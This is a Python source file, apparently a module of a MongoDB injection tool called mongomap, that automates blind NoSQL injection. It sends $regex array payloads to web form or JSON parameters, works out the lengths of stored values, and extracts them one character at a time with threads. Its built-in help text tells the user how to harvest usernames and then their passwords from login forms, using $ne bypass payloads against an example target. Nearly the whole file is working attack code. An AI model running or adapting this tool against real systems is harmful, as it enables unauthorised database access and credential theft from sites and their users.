import copy;
from util.output import verbose;
from util.output import success;
from util.output import failure;
from util.output import question;
from util.output import bold;
from util.output import info;

import threading

class RegexArrayBlindInjection:
    def doc(self):
        bold("--Description--");
        print("Attempts to send an array with a regex parameter instead of single values via \
post/get requests in order to steal data sequentially with blind injection.");
        print("");
        bold("--How it works--");
        print("First, the module will test if the target is vulnerable (payload is 'param[$regex]=.').");
        print("Then, the module will attempt to gather the data's maximum length with blind injection \
by repeating a length regex check like so:");
        print("param[$regex]=.{1}");
        print("param[$regex]=.{2}");
        print("param[$regex]=.{3}");
        print("Until the site shows a difference. The module will use the payload 'param[$regex]=^.{length}$' \
in order to retrieve some different lengths.");
        print("For every length retrieved, the module will attempt to steal one piece of data. This is done \
with repeated regex checks, like such:");
        print("The example here will use the value 'admin'");
        print("param[$regex]=a.{4}");
        print("param[$regex]=aa.{3}");
        print("param[$regex]=ab.{3}");
        print("param[$regex]=ac.{3}");
        print("param[$regex]=ad.{3}");
        print("param[$regex]=ada.{2}");
        print("This repeats until 'admin' can be found.");
        bold("--Output--");
        print("This module will output any values it can steal via this method.");
        bold("--Extra Notes--");
        print("This module currently cannot steal all values present in the database. Values of the \
same length will not be stolen as they currently are not differentiated from other values.");
        print("This module can be paired very well with some manual [$ne] tags. For example, if you are \
dealing with a login form, and you know no usernames, you can start with this:");
        print("mongomap.py -u http://target.com/ -method post -data 'username=1&password[$ne]=1' -p username");
        print("This will show as many usernames as the module can find. You can then steal assosiated \
passwords with:");
        print("mongomap.py -u http://target.com/ -method post -data 'username=stolenuser&password=1' -p password");
        
    def getID(self):
        return 1;
        
    def getType(self):
        return "a";
    def __init__(self,url,param,scanner):
        self.url = url;
        self.param = param;
        self.scanner = scanner;
        self.workingdata = scanner.data;

    def vulnTest(self):
        data = copy.deepcopy(self.scanner.data);
        self.injectRegex(data,self.param,".");
        #data.pop(self.param);
        #data[self.param+"[$regex]"] = ".";
        req = self.scanner.sendData(data);
        check = self.scanner.check(req);
        if check != "none":
            verbose(check+" has changed!");
            return True;
        return False;

    def grabData(self):
        maxLength = self.retrieveMaxLength();
        lengths = self.retrieveLengths(maxLength);
        if lengths == -1:
            return None;
        words = [];
        threads = [];
        
        for length in lengths:
            if len(threads) > self.scanner.maxthreads:
                threads.pop().join();
            thread = threading.Thread(target = self.grabWordFromLength, args = (words,length));
            threads.append(thread);
            thread.start();

        for thread in threads:
            thread.join();
        return words;

    def grabWordFromLength(self,words,length):
        words.append(self.grabWord(length));

##    def grabWord(self,length):
##        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\\\"#$%&'._()*+,-/:;<=>?@{|}[\]^`~"
##        var = [];
##        while len(self.fromVarToString(var)) < length:
##            prev = len(var);
##            for c in charset:
##                c = "[" + c + "]";
##                data = copy.deepcopy(self.scanner.data);
##                data.pop(self.param);
##                data[self.param+"[$regex]"] = "".join(var)+c+".{"+str(length-1-len(var))+"}";
##                #print("".join(var)+c+".{"+str(length-1-len(var))+"}");
##                req = self.scanner.sendData(data);
##                check = self.scanner.check(req);
##                if check != "none":
##                    var.append(c);
##                    info(self.fromVarToString(var));
##                    break;
##            if prev == len(var):
##                failure("Something went wrong.");
##                return None;
##        return self.fromVarToString(var);

    def grabWord(self,length):
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\\\"#$%&'._()*+,-/:;<=>?@{|}[\]^`~"
        var = [];
        while len(self.fromVarToString(var)) < length:
            prev = len(var);
            threads = []
            for c in charset:
                if len(threads) > self.scanner.maxthreads:
                    threads.pop().join();
                thread = threading.Thread(target = self.grabLetter, args = (length,var,c));
                threads.append(thread);
                thread.start();

            for thread in threads:
                thread.join();
            
            if prev == len(var):
                failure("Something went wrong.");
                if not question("Try again?"):
                    return None;
                else:
                    var = [];
                    continue;
        return self.fromVarToString(var);

    def grabLetter(self,length,var,c):
        try:
            oldVarLength = len(var);
            if c == "\\":
                c += c; #Make sure it's escaped
            if c == "^":
                c = "\\^"; #Make sure this is escaped. ^ means anything
            c = "[" + c + "]";
            data = copy.deepcopy(self.scanner.data);
            self.injectRegex(data,self.param,"^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$");
            #data.pop(self.param);
            #data[self.param+"[$regex]"] = "^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$";
            #print("^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$");
            req = self.scanner.sendData(data);
            check = self.scanner.check(req);
            if check != "none":
                if len(var) == oldVarLength:
                    var.append(c);
                    info(self.fromVarToString(var) + "."*(length-len(var)));
        except Exception as e:
            failure(str(e));
            self.grabLetter(length,var,c);
                
    def fromVarToString(self,var):
        string = "";
        for i in var:
            if len(i) == 3:
                string += i[1];
            else:
                string += i;
        return string;

    def retrieveLengths(self,maxLength):
        lengths = [];
        for length in range(1,maxLength+1):
            try:
                data = copy.deepcopy(self.scanner.data);
                self.injectRegex(data,self.param,"^(.{"+str(length)+"})$");
                #data.pop(self.param);
                #data[self.param+"[$regex]"] = "^(.{"+str(length)+"})$";
                req = self.scanner.sendData(data);
                check = self.scanner.check(req);
                if check != "none":
                    lengths.append(length);
                    success("Retrieved length " + str(length));
            except Exception as e:
                print(e);
                failure("Failed to retrieve exact length.");
                return lengths;
        return lengths;

    def retrieveMaxLength(self):
        try:
            length = 1;
            data = copy.deepcopy(self.scanner.data);
            self.injectRegex(data,self.param,".{"+str(length)+"}");
            #data.pop(self.param);
            #data[self.param+"[$regex]"] = ".{"+str(length)+"}";
            req = self.scanner.sendData(data);
            check = self.scanner.check(req);
            
            while check != "none":
                if length == 70:
                    if question("Length abnormally long. Do you want to terminate the program?"):
                        return -1;
                length += 1;
                data = copy.deepcopy(self.scanner.data);
                self.injectRegex(data,self.param,".{"+str(length)+"}");
                #data.pop(self.param);
                #data[self.param+"[$regex]"] = ".{"+str(length)+"}";
                req = self.scanner.sendData(data);
                check = self.scanner.check(req);

            success("Retrieved max length: " + str(length-1));
            return length-1;
        except Exception as e:
            print(e);
            failure("Failed to retrieve max length.");
            return -1;

    def injectRegex(self,data,param,value):
        if self.scanner.method == "json":
            data[param] = {"$regex":value};
        else:
            data.pop(self.param);
            data[self.param+"[$regex]"] = value;
    
